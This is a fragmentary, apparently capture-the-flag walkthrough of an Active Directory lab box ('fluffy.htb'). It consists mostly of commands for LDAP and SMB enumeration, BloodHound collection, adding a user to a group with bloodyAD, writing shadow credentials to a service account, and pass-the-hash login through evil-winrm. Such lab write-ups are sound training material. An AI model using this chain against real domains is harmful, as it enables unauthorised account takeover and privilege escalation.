...
```bash
ldapsearch -H ldap://10.129.9.229 -D "j.fleischman@fluffy.htb" -w "[REDACTED]" -b "" -s base currentTime
```
...
```bash
smbclient -U "j.fleischman@fluffy.htb%[REDACTED]" -L "\\10.129.9.229"
```
...
```bash
smbclient -U "j.fleischman@fluffy.htb%[REDACTED]" "\\10.129.9.229\IT"
```
...
```bash
bloodhound-python -d fluffy.htb -u p.agila -p [REDACTED] -c All -ns 10.129.9.229
```
...
```bash
./bloodyAD.py --host 10.129.232.88 -d fluffy.htb -u p.agila -p [REDACTED] add groupMember "Service Accounts" p.agila
```

Now that we have a `GenericWrite` permission, the next step is to add shadow credentials to the `WINRM_SVC` service account.

```bash
./bloodyAD.py --host 10.129.232.88 -d fluffy.htb -u p.agila -p [REDACTED] add shadowCredentials winrm_svc
```
...
```bash
evil-winrm -i 10.129.232.88 -u winrm_svc -H [REDACTED-NT-HASH]
```
